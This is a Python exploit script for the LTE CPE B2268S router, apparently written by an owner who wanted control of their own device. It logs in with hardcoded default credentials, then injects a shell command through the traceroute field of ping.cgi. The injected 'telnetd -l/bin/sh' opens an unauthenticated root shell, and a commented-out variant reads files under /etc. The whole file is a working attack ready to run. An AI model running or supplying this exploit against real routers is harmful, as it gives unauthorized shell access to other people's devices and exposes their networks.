#!/usr/bin/env python3

########################################################################################################
#
# LTE CPE B2268S Router
# version: V100R001C35SP100B529
#
# Busybox Command Injection, vulnerability in the traceroute command
#
# Payload: 
# data = {
#   'authToken': token, <= retrieved by get_token() method
#   'ping': '2', => traceroute
#   'IPaddress': '0.0.0.0 ;telnetd -l/bin/sh #',
# } POST => ping.cgi
#
# the "telnetd -l/bin/sh" cmd opens a shell without loging in when connecting
# with telnet: telnet 192.168.1.1 23 => shell
# Spend most of time trying to shorten the payload as it seems to be truncated
# after x amount of characters.
#
# This corporate fuckery is insane, they sell you something you can't
# control, even the most basic stuff
#
# This is what helped the most:
# https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/
#
########################################################################################################

import requests
import re
import base64


base = 'https://192.168.1.1/'
login = 'login.cgi'
index = 'indexMain.cgi'
ping = 'ping.cgi'

user = 'User'
passwd = 'LTEcpe'


session = requests.session()
authToken = None


def get_token(page):
    res = session.get(base + page, verify=False)
    matches = re.findall('<input type="hidden" id="authToken" name="authToken" value="(.{64})"/>', res.text)
    return matches[0]


def test_login():

    #print('sending login data..')
    encode_passwd = base64.b64encode(passwd.encode('utf-8'))
    salt = authToken
    salt_passwd = salt + encode_passwd.decode('utf-8')
    encrypt_passwd = base64.b64encode(salt_passwd.encode('utf-8'))

    # logining in
    data = dict({
        'authToken': authToken,
        'UserName': 'User',
        'password': encrypt_passwd,
        'hiddenPassword': encrypt_passwd,
        'submitValue': '1'
    })
    res = session.post(base + login, data=data, verify=False)
    #print(res.text)

    # redirecting
    data = dict({
        'submitValue': '0'
    })
    res = session.post(base + index, data=data, verify=False)
    #print(res.text)


def test_ping(method, ip):

    token = get_token(ping)

    data = dict({
        'authToken': token,
        'ping': method,
        'IPaddress': ip,
    })
    
    res = session.post(base + ping, data=data, verify=False)

    matches = re.findall('<textarea name="LineInfoDisplay" align="left" cols="100%" rows="15" readonly >([\s\S]*)</textarea>', res.text)

    print(matches[0])


def main():

    global authToken

    authToken = get_token(login)

    if authToken is not None:
        test_login()
        #test_ping('2', '0.0.0.0 ;cat /etc/sh* #')
        test_ping('2', '0.0.0.0 ;telnetd -l/bin/sh #')

if __name__ == "__main__":
    main()
